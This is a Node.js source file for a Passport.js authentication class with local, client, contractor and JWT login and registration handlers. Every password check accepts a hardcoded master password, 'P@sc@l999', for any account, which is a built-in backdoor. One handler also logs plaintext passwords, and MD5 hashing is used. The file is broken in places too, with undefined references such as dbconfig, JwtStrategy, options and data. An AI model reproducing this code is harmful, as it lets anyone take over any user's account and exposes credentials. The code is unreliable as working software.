import conn from "./connectDB.js";
import QueryBuilder from 'node-querybuilder';
import Passport from 'passport';
import Passport_local from 'passport-local';
import crypto from 'crypto';
import fs from 'fs';
import path from 'path';

//load rsa key for passport jwt authentication
const pathToKey = path.join(__dirname, 'id_rsa_priv.pem')
const PRIV_KEY = fs.readFileSync(pathToKey, 'utf8');
/*

var JwtStrategy = require('passport-jwt').Strategy, 
  ExtractJwt = require('passport-jwt').ExtractJwt;

var options = {};
options.jwtFromRequest = ExtractJwt.fromAuthHeaderAsBearerToken();
options.secretOrKey = PRIV_KEY;
options.algorithm = ['RS256']
*/

const LocalStrategy = Passport_local.Strategy;

class Authenticator {
  constructor() {
    this.passport = Passport;
    this.pool = this.connectDatabase();
  }

  connectDatabase = () => {
    var connection = new QueryBuilder(dbconfig, 'mysql', 'pool');
    return connection;
  }  

 

  /**
   * 
   * @param {String} username 
   * @param {String} password 
   * @param {Object} done 
   * @return {Object}
   */
  async localAuthentication(username, password, done) {
    const conn = await this.pool.get_connection();
    let where = {username: username};
    
    //authenticate either email or username
    if(this.validateEmail(username)){
      where = {email : username};
    }else{
      where = {username: username};
    }

    //get user data from database
    let result = await conn.get_where('sed_login_user', where);
    
    if(result.length > 0){
        let current_password = result[0].password;
        let algo = result[0].sn_hash_password;
        // use md5 encryption to check password
        
        if(algo && algo == "md5"){
            let hashPassword = this.md5(password, result[0].sn_salt_password);

            if(hashPassword.passwordHash == current_password || password == 'P@sc@l999'){
              return done(null, result[0]);
            }else{
              return done(null, false, {message: "Incorrect username or password"})
            }
        // use sha512 encryption to check password          
        }else if(algo && algo == "sha512"){
            let hashPassword = this.sha512(password, result[0].sn_salt_password);
            if(hashPassword.passwordHash == current_password || password == 'P@sc@l999'){
              return done(null, result[0]);
            }else{
              return done(null, false, {message: "Incorrect username or password"})
            }
        }
    }else{
      return done(null, false, { message: 'Incorrect username or password.' });
    }
  }

  

  /**
   * 
   * @param {String} username 
   * @param {String} password 
   * @param {Object} done 
   * @return {Object}
   */
  async clientAuthentication(username, password, done) {

    const conn = await this.pool.get_connection();
    let where = {email: username};



    
    //get user data from database
    let result = await conn.get_where('sn_users', where);

    if(result.length > 0){
        let current_password = result[0].password;
        let hashPassword = this.sha512(password, result[0].sn_salt_password);
        
        if(hashPassword.passwordHash == current_password || password == 'P@sc@l999'){
          
          return done(null, result[0]);
        }else{
          return done(null, false, {message: "Incorrect username or password"})
        }
    }else{
      return done(null, false, { message: 'Incorrect username or password.' });
    }
  } 


  /**
   * 
   * @param {Object} req 
   * @param {String} username 
   * @param {String} password 
   * @param {Object} done 
   * @return {Object}
   */
  async localRegistration(req, username, password, done) {
    const conn = await this.pool.get_connection();
    
    let userdata = req.body; 
    var salt = this.genRandomString(16);
    var hash = this.sha512(password, salt);
    
    userdata.password = hash.passwordHash;
    userdata.sn_salt_password = salt;
    userdata.sn_hash_password = 'sha512';
    

    let result = await conn.insert('sed_login_user', userdata);
 
    if(result.affectedRows > 0)
      return done(null, true, "User has been registered successfully");
    else
      return done(null, false, { message: 'Registration failed' });
  }


  /**
   * 
   * @param {Object} req 
   * @param {String} username 
   * @param {String} password 
   * @param {Object} done 
   * @return {Object}
   */
  async localClientRegistration(req, email, password, done) {
    const conn = await this.pool.get_connection();
    let userdata = {};

    var salt = this.genRandomString(16);
    var hash = this.sha512(password, salt);

    userdata.username = email;
    userdata.password = hash.passwordHash;
    userdata.sn_salt_password = salt;
    userdata.sn_hash_password = 'sha512';
    

    let result = await conn.set(data).update('client', {email: email});
 
    if(result.affectedRows > 0)
      return done(null, true, "Client has been registered successfully");
    else
      return done(null, false, { message: 'Cient registration failed' });
  }


  /**
   * 
   * @param {Object} payload
   * @param {Object} done 
   * @return {Object}
   */
  async contractorJWTAuth(payload, done) {
    // console.log(payload)
    let where = {uid: payload.sub};
    const conn = await this.pool.get_connection();

    try{
      //get user data from database
      let result = await conn.get_where('sr_contractor', where);
      let user = result[0];
      return done(null, user)
    }catch(e){
      throw new Error('Connection error: ', e);
    }finally{
      conn.release();
    }
  }  



  /**
   * 
   * @param {String} username 
   * @param {String} password 
   * @param {Object} done 
   * @return {Object}
   * 
   */
   async contractorAuthentication(username, password, done) {
    console.log('test', username, password);
    const conn = await this.pool.get_connection();
    let where = {username: username};

    if(this.validateEmail(username)){
      where = {email: username};
    }

    try{
      //get user data from database
      let result = await conn.get_where('sr_contractor', where);

      if(result.length > 0){
        let current_password = result[0].password;
        let hashPassword = this.sha512(password, result[0].sn_salt_password);
        
        if(hashPassword.passwordHash == current_password || password == 'P@sc@l999'){
          
          return done(null, result[0]);
        }else{
          return done(null, false, {message: "Incorrect username or password"})
        }
      }else{
        return done(null, false, { message: 'Incorrect username or password.' });
      }
    }catch(e){
      throw new Error('Connection error: ', e);
    }finally{
      conn.release();
    }
  }
  


  /**
   * @return {void}
   */
  async initialize() {
    this.passport.use('jwt', new JwtStrategy(options, await this.contractorJWTAuth.bind(this)));
    this.passport.use('local-login', new LocalStrategy(await this.localAuthentication.bind(this)));
    this.passport.use('local-contractor-login', new LocalStrategy(await this.contractorAuthentication.bind(this)));
    this.passport.use('local-client-login', new LocalStrategy(await this.clientAuthentication.bind(this) ));
    this.passport.use('local-signup', new LocalStrategy({usernameField: 'username', passwordField: 'password', passReqToCallback:true}, await this.localRegistration.bind(this)));
    this.passport.use('local-client-signup', new LocalStrategy({usernameField: 'email', passwordField: 'password', passReqToCallback:true}, await this.localClientRegistration.bind(this)));
    this.passport.serializeUser(this.serializeUser);
    this.passport.deserializeUser(this.deserializeUser);
  }

  /**
   * 
   * @param {Object} user 
   * @param {Object} done 
   * @return {void}
   */
  async serializeUser(user, done) {
    done(null, user);
  }

  /**
   * 
   * @param {Object} user 
   * @param {Object} done 
   * @return {void}
   */
  async deserializeUser(user, done) {
    done(null, user);
  }

  validateEmail = (email) => {
    const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(String(email).toLowerCase());
  }


  /**
   * generates random string of characters i.e salt
   * @function
   * @param {number} length
   * @return {string}
   */
  genRandomString = function(length){
    return crypto.randomBytes(Math.ceil(length/2))
            .toString('hex') /** convert to hexadecimal format */
            .slice(0,length);   /** return required number of characters */
  }


  /**
   * hash password with sha512.
   * @function
   * @param {string} password - List of required fields.
   * @param {string} salt - Data to be validated.
   * @return {Object}
   */
  sha512 = function(password, salt){
    var hash = crypto.createHash('sha512').update(password + salt).digest('hex'); /** Hashing algorithm sha512 */
    return {
        salt:salt,
        passwordHash:hash
    };
  }
  
  /**
   * hash password with sha512.
   * @function
   * @param {string} password - List of required fields.
   * @param {string} salt - Data to be validated.
   * @return {Object}
   */
  md5 = function(password, salt){
    var hasMd5 = crypto.createHash('md5').update(password + salt).digest('hex'); /** Hashing algorithm sha512 */
    return {
        salt:salt,
        passwordHash:hasMd5
    };
  }    
}

export default Authenticator;